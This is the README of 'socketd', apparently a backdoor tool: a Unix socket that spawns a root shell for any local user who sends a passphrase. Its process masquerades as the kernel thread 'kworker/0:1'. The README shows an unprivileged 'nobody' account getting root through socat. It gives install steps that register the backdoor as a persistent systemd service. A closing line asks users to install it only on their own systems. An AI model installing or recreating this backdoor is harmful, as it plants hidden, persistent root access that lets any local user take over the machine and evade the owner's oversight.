socketd
========

A simple unix socket that spawns you a shell when you send it a password.

## connecting as a client

```shell
bash-4.3$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)

bash-4.3$ socat - UNIX-CONNECT:/run/socketd.sock
knock knock m0therfucker
[kworker/0:1]: 0: can't access tty; job control turned off

[root@star.apricot.pictures]:/$ id
uid=0(root) gid=0(root) groups=0(root)
```

## installing

```shell
git clone --depth=1 https://github.com/raincoats/socketd
cd socketd
sudo make install
sudo cp socketd.service /etc/systemd/system
sudo systemctl enable socketd
sudo systemctl start socketd
```

## disclaimer

please don't be rude, install this only on your own systems
